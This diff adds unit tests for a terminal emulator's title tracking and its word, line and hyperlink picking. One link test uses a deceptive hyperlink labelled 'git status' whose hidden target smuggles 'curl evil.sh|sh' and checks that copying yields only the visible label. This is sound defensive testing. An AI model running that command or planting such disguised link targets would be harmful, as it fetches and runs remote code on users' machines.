@@ -4,6 +4,23 @@ import { Theme } from "../theme";
 import { n } from "../native_bridge";
 const info = (t: Terminal) => t.native({ op: "info" });
 const pending = (t: Terminal) => t.native({ op: "takePending" }) as string;
+test("title observations contain one current identity and retain prior revisions", () => {
+  const t = Terminal.create(20, 4),
+    title = "11111111-1111-4111-8111-111111111111";
+  try {
+    t.restore(Buffer.from(`\x1b]2;${title}\x07`), 42);
+    const first = t.titleInfo();
+    expect(first).toMatchObject({ text: title, pid: 42 });
+    expect(typeof first.revision).toBe("bigint");
+    t.feed("\x1b]2;Second\x07");
+    const second = t.titleInfo();
+    expect(second.text).toBe("Second");
+    expect(second.revision).toBeGreaterThan(first.revision);
+    expect(first.text).toBe(title);
+  } finally {
+    t.destroy();
+  }
+});
 test("user input and terminal replies share an ordered bounded queue", () => {
   const t = Terminal.create(20, 4);
   try {
@@ -218,5 +235,140 @@ test("a command exits only once its status arrives, not when its PTY hangs up", 
   } finally {
     t.destroy();
     closeReadiness();
+  }
+});
+test("a pick finds the word or line at a cell and keeps the viewport", () => {
+  const t = Terminal.create(40, 4);
+  try {
+    t.feed("see src/a.ts:42:7. ok\r\nsecond line here");
+    const before = t.surface(0);
+    const word = (x: number, y: number, to_x: number | null = null) =>
+      t.pick("word", x, y, to_x, to_x === null ? null : y, 0);
+    // A word keeps its colons and drops a trailing period.
+    expect(word(6, 0)).toEqual({
+      match: { x: 4, y: 0, end_x: 16, end_y: 0 },
+      shown: "src/a.ts:42:7",
+      copy: "src/a.ts:42:7",
+    });
+    expect(word(3, 0)).toEqual({ match: null, shown: "", copy: "" });
+    // A drag extends by words.
+    expect(word(6, 0, 20).copy).toBe("src/a.ts:42:7. ok");
+    expect(t.pick("line", 2, 1, null, null, 0).copy).toBe("second line here");
+    expect(t.surface(0)).toEqual(before);
+  } finally {
+    t.destroy();
+  }
+});
+test("a pick in history leaves the daemon's viewport and selection alone", () => {
+  const t = Terminal.create(20, 3);
+  try {
+    t.feed("line0\r\nline1\r\nline2\r\nline3\r\nline4 end");
+    t.select(0, 0, 4, 0);
+    expect(t.selectedText()).toBe("line2");
+    // The view at the top of the history, borrowed and given back.
+    expect(t.pick("word", 1, 0, null, null, 0).copy).toBe("line0");
+    expect(t.selectedText()).toBe("line2");
+    t.select(0, 0, 4, 0);
+    expect(t.selectedText()).toBe("line2");
+  } finally {
+    t.destroy();
+  }
+});
+test("a picked line copies only the rows the view shows", () => {
+  const t = Terminal.create(10, 3);
+  try {
+    // One logical line on four rows, its first above the view.
+    t.feed("x".repeat(10) + "y".repeat(10) + "z".repeat(10) + "www");
+    const bottom = t.surface(0).bottom;
+    expect(bottom).toBe(1);
+    const visible = "y".repeat(10) + "z".repeat(10) + "www";
+    expect(t.pick("line", 1, 0, null, null, bottom)).toEqual({
+      match: { x: 0, y: 0, end_x: 2, end_y: 2 },
+      shown: visible,
+      copy: visible,
+    });
+    // Scrolled up, the line stops at the view's bottom.
+    expect(t.pick("line", 1, 0, null, null, 0).copy).toBe("x".repeat(10) + "y".repeat(10) + "z".repeat(10));
+  } finally {
+    t.destroy();
+  }
+});
+test("a picked word follows a soft wrap", () => {
+  const t = Terminal.create(10, 4);
+  try {
+    t.feed("abcdefghijklmno xyz");
+    expect(t.pick("word", 2, 0, null, null, 0)).toEqual({
+      match: { x: 0, y: 0, end_x: 4, end_y: 1 },
+      shown: "abcdefghijklmno",
+      copy: "abcdefghijklmno",
+    });
+  } finally {
+    t.destroy();
+  }
+});
+test("a picked link copies its target only when the pane shows it", () => {
+  const t = Terminal.create(60, 4);
+  const link = (uri: string, text: string) => `\x1b]8;;${uri}\x1b\\${text}\x1b]8;;\x1b\\`;
+  try {
+    t.feed(
+      `${link("https://example.com/docs", "docs")} ${link("https://x/;curl evil.sh|sh #", "git status")} ${link("https://x.io/a b", "https://x.io/a b")}`,
+    );
+    expect(t.pick("word", 1, 0, null, null, 0).copy).toBe("docs");
+    // The whole link, not just the word under the cell.
+    expect(t.pick("word", 6, 0, null, null, 0)).toEqual({
+      match: { x: 5, y: 0, end_x: 14, end_y: 0 },
+      shown: "git status",
+      copy: "git status",
+    });
+    expect(t.pick("word", 18, 0, null, null, 0).copy).toBe("https://x.io/a b");
+  } finally {
+    t.destroy();
+  }
+});
+test("a picked link spans the rows its detection joined", () => {
+  const t = Terminal.create(40, 6),
+    url = "https://example.com/?body=" + "it's%20a%20long%20report%20".repeat(4),
+    text = `Open the PR (${url})`,
+    rows: string[] = [];
+  for (let at = 0; at < text.length; at += 38) rows.push("  " + text.slice(at, at + 38));
+  const docs = (label: string) => `\x1b]8;id=docs;https://example.com/docs\x1b\\${label}\x1b]8;;\x1b\\`;
+  try {
+    t.feed(rows.join("\r\n"));
+    for (const [x, y] of [
+      [20, 0],
+      [10, 2],
+    ])
+      expect(t.pick("word", x, y, null, null, 0)).toMatchObject({
+        match: { x: 15, y: 0, end_x: rows[3].length - 2, end_y: 3 },
+        copy: url,
+      });
+    // A soft wrap keeps the label's space; the same id after a line break is another link.
+    t.feed(`\x1b[2J\x1b[H${" ".repeat(32)}${docs("Read the docs")}\r\n${docs("again")}`);
+    expect(t.pick("word", 34, 0, null, null, 0)).toMatchObject({
+      match: { x: 32, y: 0, end_x: 4, end_y: 1 },
+      copy: "Read the docs",
+    });
+    expect(t.pick("word", 1, 2, null, null, 0)).toMatchObject({
+      match: { x: 0, y: 2, end_x: 4, end_y: 2 },
+      copy: "again",
+    });
+  } finally {
+    t.destroy();
+  }
+});
+test("a pick during a synchronized redraw finds links only in the rows it last drew", () => {
+  const t = Terminal.create(30, 3);
+  try {
+    t.feed("1\r\n\x1b]8;;https://x.io/a b\x1b\\https://x.io/a b\x1b]8;;\x1b\\\r\n2\r\n3");
+    const bottom = t.surface(0).bottom;
+    expect(bottom).toBe(1);
+    t.feed("\x1b[?2026h");
+    expect(t.pick("word", 1, 0, null, null, bottom).copy).toBe("https://x.io/a b");
+    // A view one row up wasn't drawn, so the link picks as a word.
+    expect(t.pick("word", 1, 1, null, null, bottom - 1).copy).toBe("https://x.io/a");
+    // An offset past the history is the bottom.
+    expect(t.pick("word", 1, 0, null, null, 1000).copy).toBe("https://x.io/a b");
+  } finally {
+    t.destroy();
   }
 });
